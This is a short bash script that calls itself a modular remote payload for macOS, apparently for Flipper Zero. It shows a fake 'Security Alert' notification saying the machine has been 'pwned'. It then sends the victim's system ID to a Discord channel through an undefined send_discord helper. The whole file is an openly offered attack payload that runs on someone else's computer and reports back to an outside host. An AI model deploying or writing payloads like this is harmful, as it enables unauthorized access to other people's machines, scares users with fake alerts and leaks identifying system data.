#!/bin/bash
# ============================================================
# Notification Spam for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

MESSAGE="${MSG:-You have been pwned by Flipper Zero!}"
TITLE="${TITLE:-Security Alert}"

# Send notification using osascript
osascript -e "display notification \"$MESSAGE\" with title \"$TITLE\""

send_discord "🔔 **Notification Sent on $SYSID** (macOS)"

